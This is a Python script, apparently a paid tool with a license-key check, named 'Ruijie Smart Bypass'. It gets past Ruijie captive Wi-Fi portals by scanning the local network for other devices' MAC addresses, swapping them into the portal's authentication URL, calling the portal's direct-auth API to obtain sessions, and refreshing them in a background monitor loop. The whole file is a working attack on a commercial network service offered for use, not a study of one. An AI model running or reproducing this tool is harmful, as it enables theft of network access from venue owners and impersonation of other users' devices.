import os
import re
import time
import socket
import json
import subprocess
import sys
import urllib3
import urllib.request
import requests
import base64
import hashlib
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ==================== Disable warnings ====================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== Crypto (AES) ====================
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

KEY_HEX = "000102030405060708090a0b0c0d0e0f"
IV_HEX  = "101112131415161718191a1b1c1d1e1f"
key = bytes.fromhex(KEY_HEX)
iv  = bytes.fromhex(IV_HEX)

def aes_encrypt(plain_text):
    if HAS_CRYPTO:
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            padded_data = pad(plain_text.encode("utf-8"), AES.block_size)
            encrypted_bytes = cipher.encrypt(padded_data)
            return base64.b64encode(encrypted_bytes).decode()
        except: return base64.b64encode(plain_text.encode()).decode()
    else:
        return base64.b64encode(plain_text.encode()).decode()

def aes_decrypt(token):
    if HAS_CRYPTO:
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted_bytes = cipher.decrypt(base64.b64decode(token))
            return unpad(decrypted_bytes, AES.block_size).decode()
        except: return base64.b64decode(token).decode()
    else:
        return base64.b64decode(token).decode()

# ==================== COLOR CODES ====================
w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"
RESET = "\033[0m"
BOLD = "\033[1m"
CYAN = "\033[1;36m"
YELLOW = y
GREEN = g
RED = r
BLUE = b
WHITE = w

# ==================== CONFIG ====================
PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkhHMAc23UC9rjnSk2j/p
GUFWayCCvNfLgE13O+x5RbIuCQva2GSogaVFh1JzICAdnIlmBAd+BG6+wib9+uN/
ZEeCCus+vZGTYTiHaiYaFdZYKCxhT/XHIBJXtg2dwiGIzAR01/QGZZgYNZ0zxri+
k6nNvtEEWXf6I67bNC1y74+7OFpcrXMoh3LzB8gKNWJrCIfYPOaNRUQ6jRD8r0Ey
t7rrWQ3jYYZoAFax5yXrFs6ZWB/QXpBlSmxS4Wmhuky4I7E9OOqMageXISWFiu4R
T0yjQqZkZ8VxYaBi9hVfEzvA5MeZzhQ2ekpBXcMUbtG3wV40vXNzexQG+RxpyQyN
VQIDAQAB
-----END PUBLIC KEY-----"""

GITHUB_KEY_URL = "https://raw.githubusercontent.com/pdar6400-prog/lee/main/key.json"
TOKEN_FILE = "/sdcard/.ruijie_token" if os.path.exists("/sdcard") else ".ruijie_token"
ID_FILE = "/sdcard/.ruijie_id" if os.path.exists("/sdcard") else ".ruijie_id"
SHOP_DB = "/sdcard/.ruijie_shops.json" if os.path.exists("/sdcard") else ".ruijie_shops.json"

# ==================== KEY SYSTEM ====================
PLAN_LABELS = {
    "30m":       "30 Minutes",
    "7d":        "7 Days",
    "1m":        "1 Month",
    "unlimited": "Unlimited",
}

def get_device_id():
    hwid_file = ID_FILE
    if os.path.exists(hwid_file):
        try:
            with open(hwid_file, 'r') as f:
                saved_id = f.read().strip()
                if saved_id: return saved_id
        except: pass

    import platform, getpass, uuid
    base_info = platform.node() + platform.processor() + platform.machine() + platform.platform()
    try:
        android_info = subprocess.check_output(['getprop', 'ro.serialno'], text=True, stderr=subprocess.DEVNULL).strip()
        android_info += subprocess.check_output(['getprop', 'ro.build.id'], text=True, stderr=subprocess.DEVNULL).strip()
    except: android_info = ""
    mac_info = str(uuid.getnode())
    user_info = getpass.getuser() + str(os.cpu_count())
    final_entropy = base_info + android_info + mac_info + user_info
    new_hwid = hashlib.sha256(final_entropy.encode()).hexdigest().upper()[:16]
    try:
        with open(hwid_file, 'w') as f: f.write(new_hwid)
    except: pass
    return new_hwid

def load_local_token():
    if not os.path.exists(TOKEN_FILE): return None
    try:
        with open(TOKEN_FILE, 'r') as f: return json.load(f)
    except: return None

def save_local_token(data):
    try:
        with open(TOKEN_FILE, 'w') as f: json.dump(data, f, indent=2)
        return True
    except: return False

def delete_local_token():
    try:
        if os.path.exists(TOKEN_FILE): os.remove(TOKEN_FILE)
    except: pass

def fetch_key_db():
    """Download key.json from GitHub."""
    try:
        resp = requests.get(GITHUB_KEY_URL, timeout=8, verify=False)
        if resp.status_code == 200: return resp.json()
    except: pass
    return None

def verify_key_online(key, hwid):
    """
    Check key against GitHub database.
    Returns (valid, plan, expires_ts, message)
    """
    db = fetch_key_db()
    if db is None:
        return False, None, None, "Cannot connect to key server."

    key = key.strip().upper()
    if key not in db:
        return False, None, None, "Key not found."

    entry = db[key]

    if entry.get("hwid", "").upper() != hwid.upper():
        return False, None, None, "Key is bound to a different device."

    if not entry.get("active", True):
        return False, None, None, "Key has been revoked."

    plan      = entry.get("plan", "unlimited")
    exp_str   = entry.get("expires", None)
    expires_ts = None

    if exp_str:
        try:
            expires_ts = datetime.strptime(exp_str, "%Y-%m-%d %H:%M").timestamp()
            if time.time() > expires_ts:
                return False, None, None, f"Key expired on {exp_str}."
        except: pass

    return True, plan, expires_ts, "OK"

def is_token_valid(token, hwid):
    if not token: return False, "No token."
    if token.get("hwid", "").upper() != hwid.upper(): return False, "HWID mismatch."
    exp = token.get("expires_ts")
    if exp and time.time() > exp: return False, "Token expired."
    return True, "OK"

def format_time_left(expires_ts):
    if expires_ts is None: return f"{g}Unlimited{RESET}"
    secs = int(expires_ts - time.time())
    if secs <= 0: return f"{r}Expired{RESET}"
    if secs < 3600:   return f"{y}{secs // 60}m {secs % 60}s{RESET}"
    if secs < 86400:  return f"{y}{secs // 3600}h {(secs % 3600) // 60}m{RESET}"
    return f"{g}{secs // 86400}d {(secs % 86400) // 3600}h{RESET}"

def check_activation():
    Logo()
    hwid = get_device_id()
    token = load_local_token()
    valid, msg = is_token_valid(token, hwid)

    # Re-verify online every 6 hours to catch revoked keys
    if valid:
        last_check = token.get("last_online_check", 0)
        if time.time() - last_check > 6 * 3600:
            print(f"\n{y}[*] Re-verifying with server...{RESET}")
            ok, plan, expires_ts, vmsg = verify_key_online(token["key"], hwid)
            if ok:
                token["last_online_check"] = time.time()
                token["plan"]       = plan
                token["expires_ts"] = expires_ts
                save_local_token(token)
            else:
                delete_local_token()
                valid = False
                msg   = vmsg

    if not valid:
        print(f"\n{r}[✗] {msg}{RESET}")
        Line()
        print(f"{BOLD}  Your Device ID :{RESET} {y}{hwid}{RESET}")
        print(f"{w}  Send this ID to the developer (Telegram: @naymin126653)")
        print(f"{w}  to get your activation key.{RESET}")
        Line()
        key_input = input(f"\n{y}[?] Enter Key: {RESET}").strip().upper()
        if not key_input:
            print(f"{r}[-] No key entered. Exiting.{RESET}"); sys.exit(1)

        print(f"{y}[*] Verifying...{RESET}")
        ok, plan, expires_ts, vmsg = verify_key_online(key_input, hwid)
        if not ok:
            print(f"\n{r}[✗] {vmsg}{RESET}"); time.sleep(2); sys.exit(1)

        token = {
            "key":               key_input,
            "hwid":              hwid,
            "plan":              plan,
            "expires_ts":        expires_ts,
            "activated_at":      time.time(),
            "last_online_check": time.time(),
        }
        save_local_token(token)

    plan       = token.get("plan", "unlimited")
    time_left  = format_time_left(token.get("expires_ts"))
    plan_label = PLAN_LABELS.get(plan, plan.upper())

    print(f"\n{g}[✓] ACTIVATED SUCCESSFULLY{RESET}")
    print(f"{w}      Device ID : {y}{hwid}{RESET}")
    print(f"{w}      Plan      : {y}{plan_label}{RESET}")
    print(f"{w}      Time Left : {time_left}")
    Line()
    time.sleep(1.5)
    return True

# ==================== SHOP DATABASE HELPERS ====================
def save_shop(mac, portal_url=None):
    try:
        shops = load_all_shops()
        shops[mac] = {
            "mac": mac, 
            "portal_url": portal_url or "http://portal-as.ruijienetworks.com",
            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M")
        }
        with open(SHOP_DB, "w") as f:
            json.dump(shops, f, indent=4)
        return True
    except: return False

def load_all_shops():
    default_macs = [
        "D4:29:A7:47:B9:9B",
        "3C:19:CB:DC:AD:45",
        "14:8F:34:B7:08:41",
        "00:C3:0A:52:A5:72"
    ]
    if not os.path.exists(SHOP_DB):
        shops = {}
        for m in default_macs:
            shops[m] = {"mac": m, "portal_url": "http://portal-as.ruijienetworks.com", "last_seen": "Default"}
        with open(SHOP_DB, "w") as f:
            json.dump(shops, f, indent=4)
        return shops
    try:
        with open(SHOP_DB, "r") as f: return json.load(f)
    except: return {}

def clear_all_shops():
    if os.path.exists(SHOP_DB):
        os.remove(SHOP_DB)
        return True
    return False

# ==================== UI HELPERS ====================
def clear(): os.system('cls' if os.name == 'nt' else 'clear')
def Line():
    try: print(f"{y}-\033[1;00m" * os.get_terminal_size().columns)
    except: print(f"{y}-{w}" * 40)

def Logo():
    clear()
    logo = f"""{b}
  ______   ________  ______   _______   __       __  __    __  __    __ 
 /      \\ /        |/      \\ /       \\ /  \\     /  |/  |  /  |/  |  /  |
/$$$$$$  |$$$$$$$$//$$$$$$  |$$$$$$$  |$$  \\   /$$ |$$ |  $$ |$$ |  $$ |
$$ \\__$$/    $$ |  $$ |__$$ |$$ |__$$ |$$$  \\ /$$$ |$$ |  $$ |$$  \\/$$/ 
$$      \\    $$ |  $$    $$ |$$    $$< $$$$  /$$$$ |$$ |  $$ | $$  $$<  
 $$$$$$  |   $$ |  $$$$$$$$ |$$$$$$$  |$$ $$ $$/$$ |$$ |  $$ |  $$$$  \\ 
/  \\__$$ |   $$ |  $$ |  $$ |$$ |  $$ |$$ |$$$/ $$ |$$ \\__$$ | $$ /$$  |
$$    $$/    $$ |  $$ |  $$ |$$ |  $$ |$$ | $/  $$ |$$    $$/ $$ |  $$ |
 $$$$$$/     $$/   $$/   $$/ $$/   $$/ $$/      $$/  $$$$$$/  $$/   $$/ {w}
"""
    print(logo); Line()
    print(f"{w}      [*] Ruijie Smart Bypass - Auto Shop Detection")
    print(f"{w}      [*] Telegram: @naymin126653 / @donebro100")
    Line()

# ==================== AUTO DETECT ====================
def check_adb():
    try:
        result = subprocess.run(["adb", "devices"], capture_output=True, text=True, timeout=5)
        if "device" in result.stdout and "List of devices attached" in result.stdout:
            lines = result.stdout.splitlines()
            for line in lines[1:]:
                if line.strip() and "device" in line and "offline" not in line: return True
        return False
    except: return False

def get_my_gateway():
    try:
        output = subprocess.check_output("ip route", shell=True, stderr=subprocess.DEVNULL).decode("utf-8")
        match = re.search(r"default\s+via\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", output)
        if match: return match.group(1)
    except: pass
    if check_adb():
        try:
            output = subprocess.check_output("adb shell ip route", shell=True, stderr=subprocess.DEVNULL).decode("utf-8")
            match = re.search(r"default\s+via\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", output)
            if match: return match.group(1)
        except: pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close()
        parts = ip.split("."); parts[-1] = "1"
        return ".".join(parts)
    except: return "192.168.1.1"

def get_hostname(ip):
    try:
        socket.setdefaulttimeout(0.2)
        return socket.gethostbyaddr(ip)[0]
    except: return None

def clean_hostname(name):
    if not name: return None
    name = re.sub(r"\.(lan|local|home|net|com|org)$", "", name, flags=re.IGNORECASE)
    return name.replace("-", " ").replace("_", " ").title().strip()

def process_device(line):
    ip_match = re.search(r"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line)
    mac_match = re.search(r"lladdr\s+([0-9a-fA-F:]{17})", line)
    if ip_match and mac_match:
        ip, mac = ip_match.group(1), mac_match.group(1)
        if ip.endswith(".1"): return None
        return {"ip": ip, "mac": mac}
    return None

def scan_macs_for_bypass():
    try:
        output = subprocess.check_output(["adb", "shell", "ip", "route"]).decode()
        subnet = re.search(r"src\s+(\d{1,3}\.\d{1,3}\.\d{1,3})", output).group(1)
    except: subnet = "192.168.1"
    ips = [f"{subnet}.{i}" for i in range(1, 255)]
    with ThreadPoolExecutor(max_workers=100) as ex:
        list(ex.map(lambda ip: subprocess.run(["adb", "shell", f"ping -c 1 -w 1 {ip}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), ips))
    time.sleep(1); results = []
    try:
        output = subprocess.check_output(["adb", "shell", "ip", "neigh", "show"]).decode()
        lines = [l for l in output.split("\n") if any(s in l for s in ["REACHABLE", "STALE", "DELAY"])]
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(process_device, line) for line in lines]
            for f in as_completed(futures):
                res = f.result(); 
                if res: results.append(res)
    except: pass
    return results

# ==================== PORTAL DETECTION (WITH CACHE) ====================
_portal_cache = {"url": None, "ts": 0}
PORTAL_CACHE_TTL = 120  # seconds

def get_portal_url_silent(force=False):
    """Detect portal URL with caching to avoid repeated slow HTTP scans."""
    global _portal_cache
    now = time.time()
    if not force and _portal_cache["url"] and (now - _portal_cache["ts"]) < PORTAL_CACHE_TTL:
        return _portal_cache["url"]

    gateway = get_my_gateway()
    test_urls = [f"http://{gateway}", f"http://{gateway}:2060", "http://connectivitycheck.gstatic.com/generate_204"]
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"})
    for url in test_urls:
        try:
            resp = session.get(url, timeout=5, allow_redirects=True, verify=False)
            if "portal-as.ruijienetworks.com" in resp.url:
                _portal_cache = {"url": resp.url, "ts": time.time()}
                return resp.url
            if "portal-as.ruijienetworks.com" in resp.text:
                m = re.search(r'href=["\'](https?://portal-as\.ruijienetworks\.com[^"\']+)["\']', resp.text, re.I)
                if m:
                    _portal_cache = {"url": m.group(1), "ts": time.time()}
                    return m.group(1)
        except: continue
    return None

def replace_mac(url, new_mac):
    if "mac=" in url: return re.sub(r"(?<=mac=)[^&]+", new_mac, url)
    sep = "&" if "?" in url else "?"
    return url + sep + "mac=" + new_mac

# ==================== BYPASS CORE (WITH RETRY) ====================
def run_bypass_for_mac(portal_url, mac, retries=3):
    """
    Attempt bypass and return session ID on success, None on failure.
    Retries up to `retries` times with short back-off between attempts.
    """
    for attempt in range(retries):
        try:
            api_url = portal_url.replace("/auth/wifidogAuth/login", "/api/auth/wifidog?stage=portal&").replace("??", "?")
            new_url = replace_mac(api_url, mac)
            session = requests.Session()
            session.headers.update({"User-Agent": "Dalvik/2.1.0"})

            resp1 = session.get(new_url, timeout=10, verify=False)
            sid = None
            if "sessionId=" in resp1.url:
                sid = resp1.url.split("sessionId=")[1].split("&")[0]
            else:
                m = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)', resp1.text)
                if m: sid = m.group(1)
            if not sid:
                if attempt < retries - 1: time.sleep(1)
                continue

            pwn = "https://portal-as.ruijienetworks.com/api/auth/direct/?lang=en_US"
            resp2 = session.post(pwn, json={"phoneNumber": "", "sessionId": sid}, timeout=10, verify=False)
            logon = resp2.json().get("result", {}).get("logonUrl", "")
            if not logon:
                if attempt < retries - 1: time.sleep(1)
                continue

            if ":2060" in logon:
                final = re.sub(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", "10.44.77.240", logon)
                if session.get(final, timeout=10, verify=False).status_code == 200:
                    return sid
            else:
                if session.get(logon, timeout=10, verify=False).status_code == 200:
                    return sid

        except Exception:
            pass

        if attempt < retries - 1:
            time.sleep(1 + attempt)  # slight back-off: 1s, 2s

    return None

# ==================== CONNECTIVITY CHECK ====================
def check_internet():
    """
    Dual-check: ping 8.8.8.8 AND a TCP connection to 1.1.1.1:53.
    Returns (is_online: bool, ping_str: str).
    Requires BOTH to fail before declaring offline (avoids false positives).
    """
    ping_val = "Timed Out"
    ping_ok = False
    try:
        p_flag = '-n' if os.name == 'nt' else '-c'
        out = subprocess.check_output(
            ['ping', p_flag, '1', '-W', '1', '8.8.8.8'],
            stderr=subprocess.DEVNULL, universal_newlines=True, timeout=3
        )
        m = re.search(r"time[=<](\d+\.?\d*)", out)
        if m:
            ping_val = f"{m.group(1)}ms"
            ping_ok = True
    except Exception:
        pass

    tcp_ok = False
    try:
        s = socket.create_connection(("1.1.1.1", 53), timeout=2)
        s.close()
        tcp_ok = True
    except Exception:
        pass

    is_online = ping_ok or tcp_ok
    if tcp_ok and not ping_ok:
        ping_val = "TCP OK"
    return is_online, ping_val

# ==================== STABLE MONITOR ====================
def monitor_connection(mac, portal_url, interval=3):
    """
    Stable connection monitor with:
    - Dual connectivity check (ping + TCP) to avoid false offline detections
    - Pre-emptive refresh every REFRESH_INTERVAL seconds (before session expires)
    - Background reconnect thread so the UI loop never blocks
    - Portal URL re-detection only when truly needed (cached otherwise)
    - Reconnect back-off capped at 8 seconds
    - Status log of last 5 pings
    """
    REFRESH_INTERVAL = 40   # pre-emptive keep-alive every 40 s
    FAIL_THRESHOLD   = 4    # consecutive offline checks before reconnect (raised to avoid false drops)
    MAX_BACKOFF      = 8    # max seconds between reconnect retries

    save_shop(mac, portal_url)

    # Shared state between UI loop and reconnect thread
    state = {
        "session_id":        None,
        "reconnecting":      False,
        "reconnect_attempts": 0,
        "last_refresh":      time.time(),
        "last_status_msg":   "",
        "portal_url":        portal_url,
    }
    state_lock = threading.Lock()
    stop_event  = threading.Event()

    # ---- Background reconnect thread ----
    def reconnect_worker():
        backoff = 1
        while not stop_event.is_set():
            with state_lock:
                if not state["reconnecting"]:
                    time.sleep(0.5)
                    continue
                current_portal = state["portal_url"]
                attempt_no     = state["reconnect_attempts"]

            # Try cached portal first, then re-detect
            portals_to_try = [current_portal]
            if attempt_no > 0:
                fresh = get_portal_url_silent(force=(attempt_no % 3 == 0))
                if fresh and fresh != current_portal:
                    portals_to_try.insert(0, fresh)

            sid = None
            for p in portals_to_try:
                sid = run_bypass_for_mac(p, mac, retries=2)
                if sid:
                    with state_lock:
                        state["session_id"]   = sid
                        state["portal_url"]   = p
                        state["reconnecting"] = False
                        state["reconnect_attempts"] = 0
                        state["last_refresh"] = time.time()
                        state["last_status_msg"] = f"{g}[✓] Reconnected! SID: {sid[:8]}...{RESET}"
                    backoff = 1   # reset on success
                    break

            if sid is None:
                with state_lock:
                    state["reconnect_attempts"] += 1
                    state["last_status_msg"] = (
                        f"{r}[!] Reconnect attempt #{state['reconnect_attempts']} failed. "
                        f"Retrying in {backoff}s...{RESET}"
                    )
                time.sleep(backoff)
                backoff = min(backoff * 2, MAX_BACKOFF)

    recon_thread = threading.Thread(target=reconnect_worker, daemon=True)
    recon_thread.start()

    ping_history = []
    fail_count   = 0

    # ---- Initial connect ----
    print(f"\n{y}[*] Performing initial connection...{RESET}")
    init_sid = run_bypass_for_mac(portal_url, mac, retries=3)
    if init_sid:
        with state_lock:
            state["session_id"]  = init_sid
            state["last_refresh"] = time.time()
        print(f"{g}[+] Connected! Session: {init_sid[:8]}...{RESET}")
    else:
        print(f"{r}[!] Initial connect failed — monitor will keep retrying.{RESET}")
        with state_lock:
            state["reconnecting"] = True
    time.sleep(1)

    # ---- Main UI / check loop ----
    try:
        while True:
            is_online, ping_val = check_internet()

            ping_history.append(f"{g if is_online else r}{ping_val}{RESET}")
            if len(ping_history) > 5:
                ping_history.pop(0)

            current_time = time.time()

            with state_lock:
                sid           = state["session_id"]
                reconnecting  = state["reconnecting"]
                last_refresh  = state["last_refresh"]
                status_msg    = state["last_status_msg"]
                cur_portal    = state["portal_url"]

            # --- Pre-emptive refresh when online and session is old ---
            if is_online and not reconnecting and (current_time - last_refresh) >= REFRESH_INTERVAL:
                new_sid = run_bypass_for_mac(cur_portal, mac, retries=2)
                if new_sid:
                    with state_lock:
                        state["session_id"]   = new_sid
                        state["last_refresh"] = current_time
                        state["last_status_msg"] = f"{g}[↻] Session refreshed OK{RESET}"
                    sid        = new_sid
                    status_msg = state["last_status_msg"]
                else:
                    # Always update last_refresh even on failure to avoid hammering every 3s
                    with state_lock:
                        state["last_refresh"] = current_time
                        state["last_status_msg"] = f"{y}[~] Refresh failed, retrying in {REFRESH_INTERVAL}s{RESET}"
                    status_msg = state["last_status_msg"]

            # --- Fail detection ---
            if is_online:
                fail_count = 0
            else:
                fail_count += 1

            if fail_count >= FAIL_THRESHOLD and not reconnecting:
                with state_lock:
                    state["reconnecting"]       = True
                    state["reconnect_attempts"] = 0
                    state["last_status_msg"]    = f"{r}[!] Drop detected! Reconnecting...{RESET}"
                status_msg = state["last_status_msg"]

            # --- Draw UI ---
            clear(); Logo()
            print(f"\n{g}      [+] ULTRA-STABLE MONITOR ACTIVE{w}")
            print(f"{w}      [+] Target MAC  : {y}{mac}{w}")
            print(f"{w}      [+] Portal URL  : {y}{cur_portal[:45]}...{w}")
            sid_display = f"{sid[:8]}..." if sid else f"{r}None{RESET}"
            print(f"{w}      [+] Session ID  : {y}{sid_display}{w}")
            print(f"{w}      [+] Next Refresh: {y}{max(0, int(REFRESH_INTERVAL - (current_time - last_refresh)))}s{w}")
            Line()

            net_status = f"{g}ONLINE{RESET}" if is_online else f"{r}OFFLINE{RESET}"
            recon_flag = f"  {y}[RECONNECTING...]{RESET}" if reconnecting else ""
            print(f"{BOLD}[{CYAN}📶 NETWORK{RESET}{BOLD}] {WHITE}Status: {net_status}{recon_flag}")
            print(f"{BOLD}[{CYAN}📊 PINGS{RESET}{BOLD}]   {w} | {' | '.join(ping_history)} |")
            if status_msg:
                print(f"{BOLD}[{CYAN}ℹ  INFO{RESET}{BOLD}]   {status_msg}")
            Line()

            time.sleep(interval)

    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{y}[!] Monitor stopped.{RESET}")

# ==================== SMART AUTO-CONNECT ====================
def action_smart_autoconnect():
    Logo(); print(f"\n{BLUE}⚡  SMART AUTO-CONNECT  ⚡{RESET}"); Line()
    print(f"1. {g}Auto-Connect (Saved MACs){RESET}")
    print(f"2. {y}Manual Add & Connect{RESET}")
    Line()
    choice = input(f"{y}Select Option: {RESET}").strip()
    
    portal_url = get_portal_url_silent()
    if not portal_url:
        print(f"{r}[-] Portal URL not found.{RESET}"); time.sleep(2); return

    if choice == '2':
        mac = input(f"{y}Enter MAC Address: {RESET}").strip().upper()
        if not mac: return
        save_shop(mac, portal_url)
        print(f"{y}[*] Connecting to {mac}...{RESET}")
        if run_bypass_for_mac(portal_url, mac):
            print(f"{g}[+] Success!{RESET}")
            time.sleep(1)
            monitor_connection(mac, portal_url); return
    else:
        shops = load_all_shops()
        print(f"{y}[*] Auto-testing {len(shops)} MACs...{RESET}")
        for mac in shops.keys():
            if run_bypass_for_mac(portal_url, mac):
                print(f"{g}[+] Success with {mac}!{RESET}")
                time.sleep(1)
                monitor_connection(mac, portal_url); return
    
    print(f"\n{r}[-] No MACs worked.{RESET}"); time.sleep(2)

def main():
    if check_activation():
        while True:
            Logo()
            print("1. ⚡ Smart Auto-Connect")
            print("2. 📂 View Saved MAC Database")
            print("3. 🗑️  Clear Saved Data")
            print("4. ❌ Exit")
            Line()
            choice = input(f"\n{y}Select Option: {RESET}").strip()
            if choice == '1': action_smart_autoconnect()
            elif choice == '2':
                Logo(); shops = load_all_shops()
                if not shops: print(f"{y}No saved MACs.{RESET}")
                else:
                    for i, mac in enumerate(shops.keys(), 1):
                        print(f"{i}. {g}{mac}{RESET}")
                Line(); input(f"\n{y}Press Enter to go back...{RESET}")
            elif choice == '3':
                if clear_all_shops(): print(f"{g}[+] Data cleared!{RESET}")
                else: print(f"{y}[!] Nothing to clear.{RESET}")
                time.sleep(1)
            elif choice == '4': break

if __name__ == "__main__":
    main()
